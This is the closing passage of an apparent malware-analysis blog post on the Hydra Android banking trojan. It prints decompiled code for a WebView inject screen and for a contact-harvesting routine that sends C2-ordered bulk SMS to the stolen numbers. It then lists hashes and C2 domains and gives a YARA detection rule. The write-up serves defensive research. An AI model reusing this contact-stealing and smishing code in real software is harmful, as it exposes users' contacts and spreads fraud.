            <span class="n">Timber</span><span class="p">.</span><span class="nf">d</span><span class="p">(</span><span class="s">"INJECTS -&gt; display file: "</span> <span class="p">+</span> <span class="n">s</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
        <span class="p">}</span>
        <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">void</span> <span class="nf">init</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setDomStorageEnabled</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">Build</span><span class="p">.</span><span class="n">VERSION</span><span class="p">.</span><span class="n">SDK_INT</span> <span class="p">&gt;=</span> <span class="m">21</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setMixedContentMode</span><span class="p">(</span><span class="m">0</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="n">com</span><span class="p">.</span><span class="n">sdktools</span><span class="p">.</span><span class="n">android</span><span class="p">.</span><span class="n">bot</span><span class="p">.</span><span class="n">components</span><span class="p">.</span><span class="n">injects</span><span class="p">.</span><span class="n">system</span><span class="p">.</span><span class="n">ViewerActivityInterfaceImpl</span><span class="p">.</span><span class="m">1</span> <span class="n">viewerActivityInterfaceImpl</span><span class="err">$</span><span class="m">10</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">WebChromeClient</span><span class="p">()</span> <span class="p">{</span>
            <span class="n">@Override</span>  <span class="c1">// android.webkit.WebChromeClient</span>
            <span class="k">public</span> <span class="n">boolean</span> <span class="nf">onConsoleMessage</span><span class="p">(</span><span class="n">ConsoleMessage</span> <span class="n">consoleMessage0</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">String</span> <span class="n">s</span> <span class="p">=</span> <span class="n">consoleMessage0</span><span class="p">.</span><span class="nf">message</span><span class="p">();</span>
                <span class="k">if</span><span class="p">(!</span><span class="n">TextUtils</span><span class="p">.</span><span class="nf">isEmpty</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="p">{</span>
                    <span class="n">String</span> <span class="n">s1</span> <span class="p">=</span> <span class="n">ViewerActivityInterfaceImpl</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">injectModel</span><span class="p">.</span><span class="nf">getApplicationId</span><span class="p">();</span>
                    <span class="n">InjectComponent</span><span class="p">.</span><span class="k">get</span><span class="p">().</span><span class="nf">getConfigsProvider</span><span class="p">().</span><span class="nf">getInjectHandler</span><span class="p">().</span><span class="nf">handleWebViewLog</span><span class="p">(</span><span class="n">ViewerActivityInterfaceImpl</span><span class="p">.</span><span class="k">this</span><span class="p">,</span> <span class="n">s1</span><span class="p">,</span> <span class="n">s</span><span class="p">);</span>
                <span class="p">}</span>

                <span class="k">return</span> <span class="n">super</span><span class="p">.</span><span class="nf">onConsoleMessage</span><span class="p">(</span><span class="n">consoleMessage0</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">};</span>
        <span class="n">com</span><span class="p">.</span><span class="n">sdktools</span><span class="p">.</span><span class="n">android</span><span class="p">.</span><span class="n">bot</span><span class="p">.</span><span class="n">components</span><span class="p">.</span><span class="n">injects</span><span class="p">.</span><span class="n">system</span><span class="p">.</span><span class="n">ViewerActivityInterfaceImpl</span><span class="p">.</span><span class="m">2</span> <span class="n">viewerActivityInterfaceImpl</span><span class="err">$</span><span class="m">20</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">WebViewClient</span><span class="p">()</span> <span class="p">{</span>
            <span class="n">@Override</span>  <span class="c1">// android.webkit.WebViewClient</span>
            <span class="k">public</span> <span class="n">boolean</span> <span class="nf">shouldOverrideUrlLoading</span><span class="p">(</span><span class="n">WebView</span> <span class="n">webView0</span><span class="p">,</span> <span class="n">String</span> <span class="n">s</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">Timber</span><span class="p">.</span><span class="nf">d</span><span class="p">(</span><span class="s">"INJECTS -&gt; ulr loaded: "</span> <span class="p">+</span> <span class="n">s</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="p">[</span><span class="m">0</span><span class="p">]);</span>
                <span class="n">webView0</span><span class="p">.</span><span class="nf">loadUrl</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">};</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setJavaScriptEnabled</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setLoadWithOverviewMode</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setAllowFileAccess</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setSaveFormData</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setAppCacheEnabled</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">getSettings</span><span class="p">().</span><span class="nf">setCacheMode</span><span class="p">(</span><span class="m">2</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">setBackgroundColor</span><span class="p">(</span><span class="m">0</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">setWebViewClient</span><span class="p">(</span><span class="n">viewerActivityInterfaceImpl</span><span class="err">$</span><span class="m">20</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span><span class="p">.</span><span class="nf">setWebChromeClient</span><span class="p">(</span><span class="n">viewerActivityInterfaceImpl</span><span class="err">$</span><span class="m">10</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// com.sdktools.android.core.injects_core.IScreen</span>
    <span class="k">public</span> <span class="k">void</span> <span class="nf">onCreate</span><span class="p">(</span><span class="n">Activity</span> <span class="n">activity0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">FrameLayout</span> <span class="n">frameLayout0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">FrameLayout</span><span class="p">(</span><span class="n">activity0</span><span class="p">);</span>
        <span class="n">frameLayout0</span><span class="p">.</span><span class="nf">setBackgroundColor</span><span class="p">(-</span><span class="m">1</span><span class="p">);</span>
        <span class="n">WebView</span> <span class="n">webView0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">WebView</span><span class="p">(</span><span class="n">activity0</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="n">webView</span> <span class="p">=</span> <span class="n">webView0</span><span class="p">;</span>
        <span class="n">frameLayout0</span><span class="p">.</span><span class="nf">addView</span><span class="p">(</span><span class="n">webView0</span><span class="p">,</span> <span class="k">new</span> <span class="n">FrameLayout</span><span class="p">.</span><span class="nf">LayoutParams</span><span class="p">(-</span><span class="m">1</span><span class="p">,</span> <span class="p">-</span><span class="m">1</span><span class="p">));</span>
        <span class="n">activity0</span><span class="p">.</span><span class="nf">setContentView</span><span class="p">(</span><span class="n">frameLayout0</span><span class="p">);</span>
        <span class="k">this</span><span class="p">.</span><span class="nf">init</span><span class="p">();</span>
        <span class="k">this</span><span class="p">.</span><span class="nf">handleData</span><span class="p">(</span><span class="n">activity0</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// com.sdktools.android.core.injects_core.IScreen</span>
    <span class="k">public</span> <span class="k">void</span> <span class="nf">onPause</span><span class="p">(</span><span class="n">Activity</span> <span class="n">activity0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">InjectComponent</span><span class="p">.</span><span class="n">viewerActivityVisible</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
        <span class="n">LifeCycleListener</span> <span class="n">viewerActivityInterfaceImpl</span><span class="err">$</span><span class="n">LifeCycleListener0</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">lifeCycleListener</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="n">viewerActivityInterfaceImpl</span><span class="err">$</span><span class="n">LifeCycleListener0</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">viewerActivityInterfaceImpl</span><span class="err">$</span><span class="n">LifeCycleListener0</span><span class="p">.</span><span class="nf">onPause</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// com.sdktools.android.core.injects_core.IScreen</span>
    <span class="k">public</span> <span class="k">void</span> <span class="nf">onResume</span><span class="p">(</span><span class="n">Activity</span> <span class="n">activity0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">InjectComponent</span><span class="p">.</span><span class="n">viewerActivityVisible</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
        <span class="n">LifeCycleListener</span> <span class="n">viewerActivityInterfaceImpl</span><span class="err">$</span><span class="n">LifeCycleListener0</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">lifeCycleListener</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="n">viewerActivityInterfaceImpl</span><span class="err">$</span><span class="n">LifeCycleListener0</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">viewerActivityInterfaceImpl</span><span class="err">$</span><span class="n">LifeCycleListener0</span><span class="p">.</span><span class="nf">onResume</span><span class="p">();</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// com.sdktools.android.core.injects_core.IScreen</span>
    <span class="k">public</span> <span class="k">void</span> <span class="nf">onStop</span><span class="p">(</span><span class="n">Activity</span> <span class="n">activity0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">super</span><span class="p">.</span><span class="nf">onStop</span><span class="p">(</span><span class="n">activity0</span><span class="p">);</span>
        <span class="n">activity0</span><span class="p">.</span><span class="nf">finish</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// com.sdktools.android.core.injects_core.IScreen</span>
    <span class="k">public</span> <span class="n">boolean</span> <span class="nf">overrideBackPress</span><span class="p">(</span><span class="n">Activity</span> <span class="n">activity0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">void</span> <span class="nf">startAppById</span><span class="p">(</span><span class="n">Context</span> <span class="n">context0</span><span class="p">,</span> <span class="n">String</span> <span class="n">s</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="n">context0</span><span class="p">.</span><span class="nf">startActivity</span><span class="p">(</span><span class="n">context0</span><span class="p">.</span><span class="nf">getPackageManager</span><span class="p">().</span><span class="nf">getLaunchIntentForPackage</span><span class="p">(</span><span class="n">s</span><span class="p">));</span>
        <span class="p">}</span>
        <span class="k">catch</span><span class="p">(</span><span class="n">ActivityNotFoundException</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<h2 id="steal-contacts">Steal contacts</h2>

<p>The malware collect the contacts stored in the victim’s device and send it to C2 server. And smishing the stolen numbers.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="k">static</span> <span class="n">ContactsComponent</span> <span class="k">get</span><span class="p">()</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">ContactsComponent</span><span class="p">.</span><span class="n">instance</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="n">List</span> <span class="nf">getContactList</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">ArrayList</span> <span class="n">arrayList0</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">ArrayList</span><span class="p">();</span>
        <span class="n">ContentResolver</span> <span class="n">contentResolver0</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="nf">context</span><span class="p">().</span><span class="nf">getContentResolver</span><span class="p">();</span>
        <span class="n">Cursor</span> <span class="n">cursor0</span> <span class="p">=</span> <span class="n">contentResolver0</span><span class="p">.</span><span class="nf">query</span><span class="p">(</span><span class="n">ContactsContract</span><span class="p">.</span><span class="n">Contacts</span><span class="p">.</span><span class="n">CONTENT_URI</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
        <span class="k">if</span><span class="p">((</span><span class="n">cursor0</span> <span class="p">==</span> <span class="k">null</span> <span class="p">?</span> <span class="m">0</span> <span class="p">:</span> <span class="n">cursor0</span><span class="p">.</span><span class="nf">getCount</span><span class="p">())</span> <span class="p">&gt;</span> <span class="m">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">while</span><span class="p">(</span><span class="n">cursor0</span> <span class="p">!=</span> <span class="k">null</span> <span class="p">&amp;&amp;</span> <span class="p">(</span><span class="n">cursor0</span><span class="p">.</span><span class="nf">moveToNext</span><span class="p">()))</span> <span class="p">{</span>
                <span class="n">String</span> <span class="n">s</span> <span class="p">=</span> <span class="n">cursor0</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="n">cursor0</span><span class="p">.</span><span class="nf">getColumnIndex</span><span class="p">(</span><span class="s">"_id"</span><span class="p">));</span>
                <span class="n">cursor0</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="n">cursor0</span><span class="p">.</span><span class="nf">getColumnIndex</span><span class="p">(</span><span class="s">"display_name"</span><span class="p">));</span>
                <span class="k">if</span><span class="p">(</span><span class="n">cursor0</span><span class="p">.</span><span class="nf">getInt</span><span class="p">(</span><span class="n">cursor0</span><span class="p">.</span><span class="nf">getColumnIndex</span><span class="p">(</span><span class="s">"has_phone_number"</span><span class="p">))</span> <span class="p">&lt;=</span> <span class="m">0</span><span class="p">)</span> <span class="p">{</span>
                    <span class="k">continue</span><span class="p">;</span>
                <span class="p">}</span>

                <span class="n">Cursor</span> <span class="n">cursor1</span> <span class="p">=</span> <span class="n">contentResolver0</span><span class="p">.</span><span class="nf">query</span><span class="p">(</span><span class="n">ContactsContract</span><span class="p">.</span><span class="n">CommonDataKinds</span><span class="p">.</span><span class="n">Phone</span><span class="p">.</span><span class="n">CONTENT_URI</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="s">"contact_id = ?"</span><span class="p">,</span> <span class="k">new</span> <span class="n">String</span><span class="p">[]{</span><span class="n">s</span><span class="p">},</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">while</span><span class="p">(</span><span class="n">cursor1</span><span class="p">.</span><span class="nf">moveToNext</span><span class="p">())</span> <span class="p">{</span>
                    <span class="n">arrayList0</span><span class="p">.</span><span class="k">add</span><span class="p">(</span><span class="n">cursor1</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="n">cursor1</span><span class="p">.</span><span class="nf">getColumnIndex</span><span class="p">(</span><span class="s">"data1"</span><span class="p">)));</span>
                <span class="p">}</span>

                <span class="n">cursor1</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="n">cursor0</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">cursor0</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
        <span class="p">}</span>

        <span class="k">return</span> <span class="n">arrayList0</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// android.app.LoaderManager$LoaderCallbacks</span>
    <span class="k">public</span> <span class="n">Loader</span> <span class="nf">onCreateLoader</span><span class="p">(</span><span class="kt">int</span> <span class="n">v</span><span class="p">,</span> <span class="n">Bundle</span> <span class="n">bundle0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">return</span> <span class="n">v</span> <span class="p">==</span> <span class="m">1</span> <span class="p">?</span> <span class="k">this</span><span class="p">.</span><span class="nf">contactsLoader</span><span class="p">()</span> <span class="p">:</span> <span class="k">null</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">void</span> <span class="nf">onLoadFinished</span><span class="p">(</span><span class="n">Loader</span> <span class="n">loader0</span><span class="p">,</span> <span class="n">Cursor</span> <span class="n">cursor0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">this</span><span class="p">.</span><span class="nf">contactsFromCursor</span><span class="p">(</span><span class="n">cursor0</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// android.app.LoaderManager$LoaderCallbacks</span>
    <span class="k">public</span> <span class="k">void</span> <span class="nf">onLoadFinished</span><span class="p">(</span><span class="n">Loader</span> <span class="n">loader0</span><span class="p">,</span> <span class="n">Object</span> <span class="n">object0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">this</span><span class="p">.</span><span class="nf">onLoadFinished</span><span class="p">(</span><span class="n">loader0</span><span class="p">,</span> <span class="p">((</span><span class="n">Cursor</span><span class="p">)</span><span class="n">object0</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// android.app.LoaderManager$LoaderCallbacks</span>
    <span class="k">public</span> <span class="k">void</span> <span class="nf">onLoaderReset</span><span class="p">(</span><span class="n">Loader</span> <span class="n">loader0</span><span class="p">)</span> <span class="p">{</span>
    <span class="p">}</span>

    <span class="n">@Override</span>  <span class="c1">// com.sdktools.android.bot.SdkComponent</span>
    <span class="k">public</span> <span class="k">void</span> <span class="nf">onSyncEvent</span><span class="p">(</span><span class="n">JsonObject</span> <span class="n">jsonObject0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">super</span><span class="p">.</span><span class="nf">onSyncEvent</span><span class="p">(</span><span class="n">jsonObject0</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="m">1</span> <span class="p">==</span> <span class="p">(</span><span class="n">JsonUtils</span><span class="p">.</span><span class="nf">hasObject</span><span class="p">(</span><span class="n">jsonObject0</span><span class="p">,</span> <span class="s">"bulk_sms"</span><span class="p">)</span> <span class="p">?</span> <span class="n">jsonObject0</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s">"bulk_sms"</span><span class="p">).</span><span class="nf">getAsInt</span><span class="p">()</span> <span class="p">:</span> <span class="m">0</span><span class="p">))</span> <span class="p">{</span>
            <span class="n">String</span> <span class="n">s</span> <span class="p">=</span> <span class="n">JsonUtils</span><span class="p">.</span><span class="nf">hasObject</span><span class="p">(</span><span class="n">jsonObject0</span><span class="p">,</span> <span class="s">"bulk_body"</span><span class="p">)</span> <span class="p">?</span> <span class="n">jsonObject0</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s">"bulk_body"</span><span class="p">).</span><span class="nf">getAsString</span><span class="p">()</span> <span class="p">:</span> <span class="s">""</span><span class="p">;</span>
            <span class="k">if</span><span class="p">(!</span><span class="n">TextUtils</span><span class="p">.</span><span class="nf">isEmpty</span><span class="p">(</span><span class="n">s</span><span class="p">))</span> <span class="p">{</span>
                <span class="k">this</span><span class="p">.</span><span class="nf">sendBulkSms</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="k">this</span><span class="p">.</span><span class="nf">getContactList</span><span class="p">());</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">void</span> <span class="nf">sendBulkSms</span><span class="p">(</span><span class="n">String</span> <span class="n">s</span><span class="p">,</span> <span class="n">List</span> <span class="n">list0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">for</span><span class="p">(</span><span class="n">Object</span> <span class="n">object0</span><span class="p">:</span> <span class="n">list0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="nf">sendSMS</span><span class="p">(((</span><span class="n">String</span><span class="p">)</span><span class="n">object0</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="s">" "</span><span class="p">,</span> <span class="s">""</span><span class="p">),</span> <span class="n">s</span><span class="p">);</span>
            <span class="k">try</span> <span class="p">{</span>
                <span class="n">Thread</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="m">300L</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">catch</span><span class="p">(</span><span class="n">InterruptedException</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">return</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">void</span> <span class="nf">sendSMS</span><span class="p">(</span><span class="n">String</span> <span class="n">s</span><span class="p">,</span> <span class="n">String</span> <span class="n">s1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">try</span> <span class="p">{</span>
            <span class="n">SmsManager</span><span class="p">.</span><span class="nf">getDefault</span><span class="p">().</span><span class="nf">sendTextMessage</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="n">s1</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">catch</span><span class="p">(</span><span class="n">Exception</span> <span class="n">unused_ex</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">}</span>
    <span class="p">}</span>

</code></pre></div></div>

<h1 id="iocs">IoCs</h1>

<p>APK hash: <code class="language-plaintext highlighter-rouge">8b321553f1a269ee4b68a02162ba2d14c71a92907b6001ff3db0fe5bae6b3430</code></p>

<p>Payload (KCFj.json) hash: <code class="language-plaintext highlighter-rouge">fd87c4f7c8ece0448dab67a0b689c4a417a153081059750295fbed29a1422b03</code></p>

<p>C2 server:</p>

<p>http://lalabanda.com</p>

<p>Related C2 servers:</p>

<p>http://cslon.com</p>

<p>http://cariciu-carilas.com</p>

<p>http://carilas-carilas.net</p>

<p>http://carilas-carilas.top</p>

<h1 id="yara-rule">Yara rule</h1>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rule</span> <span class="n">Hydra</span> <span class="p">{</span>
  <span class="n">meta</span><span class="p">:</span>
    <span class="n">author</span>      <span class="p">=</span> <span class="s">"@muha2xmad"</span>
    <span class="n">date</span>        <span class="p">=</span> <span class="s">"2022-09-21"</span>
    <span class="n">description</span> <span class="p">=</span> <span class="s">"Hydra android malware"</span>
    <span class="n">version</span>     <span class="p">=</span> <span class="s">"1.0"</span>

  <span class="n">strings</span><span class="p">:</span>
    <span class="err">$</span><span class="n">str00</span>  <span class="p">=</span> <span class="s">"all_data.json"</span> <span class="n">nocase</span> 

    <span class="err">$</span><span class="n">str01</span>  <span class="p">=</span> <span class="s">"res/xml/tfgztcqbitzuzb.xml"</span> <span class="n">nocase</span> 
    <span class="err">$</span><span class="n">str02</span>  <span class="p">=</span> <span class="s">"res/xml/hccnqedztpvawk.xml"</span> <span class="n">nocase</span> 
    <span class="err">$</span><span class="n">str03</span>  <span class="p">=</span> <span class="s">"res/xml/bkfzwlpvqlbmlh.xml"</span> <span class="n">nocase</span> 
    <span class="err">$</span><span class="n">str04</span>  <span class="p">=</span> <span class="s">"com.wife.dizzy/shared_prefs"</span> <span class="n">nocase</span>
  <span class="n">condition</span><span class="p">:</span>
    <span class="nf">uint32be</span><span class="p">(</span><span class="m">0</span><span class="p">)</span> <span class="p">==</span> <span class="m">0x504B0304</span> <span class="c1">// APK file signature</span>
      <span class="nf">and</span> <span class="p">(</span>	<span class="n">all</span> <span class="nf">of</span> <span class="p">(</span><span class="err">$</span><span class="n">str</span><span class="p">*))</span>
      
<span class="p">}</span>

</code></pre></div></div>

<h1 id="article-quote">Article quote</h1>

<blockquote>
  <p>فَلَستَ الثِيابَ الَّتي تَرتَدي وَلَستَ الأَسامي الَّتي تَحمِلُ وَلَستَ البِلادَ الَّتي أَنبَتَتكَ وَلَكِنَّما أَنتَ ما تَفعَلُ</p>
</blockquote>

<h1 id="ref">REF</h1>

<ul>
  <li>
    <p><a href="https://tria.ge/220920-nvay7sgean">triage report</a></p>
  </li>
  <li>
    <p><a href="https://twitter.com/muha2xmad/status/1570788983474638849">Previous Hydra analysis</a></p>
  </li>
  <li>
    <p><a href="https://github.com/cryptax/droidlysis">droidlysis</a></p>
  </li>
  <li>
    <p><a href="https://github.com/rednaga/APKiD">APKiD</a></p>
  </li>
  <li>
    <p><a href="https://github.com/frida/frida">Frida</a></p>
  </li>
</ul>


        
      </section>

      <footer class="page__meta">
        
        


  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#malware-analysis" class="page__taxonomy-item" rel="tag">Malware-analysis</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2022-09-20T00:00:00+00:00">September 20, 2022</time></p>
        
      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?text=Technical+analysis+of+Hydra+android+malware%20https%3A%2F%2Fmuha2xmad.github.io%2Fmalware-analysis%2Fhydra%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fmuha2xmad.github.io%2Fmalware-analysis%2Fhydra%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fmuha2xmad.github.io%2Fmalware-analysis%2Fhydra%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/malware-analysis/sharkbot/" class="pagination--pager" title="Technical analysis of SharkBot android malware
">Previous</a>
    
    
      <a href="/malware-analysis/ginp/" class="pagination--pager" title="Technical analysis of Ginp android malware
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
      
        
      
        
      
        
      
        
      
        
      
    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2023 Muhammad Hasan Ali. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




  <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-9P532HWLYQ"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-9P532HWLYQ');
</script>








  </body>
</html>
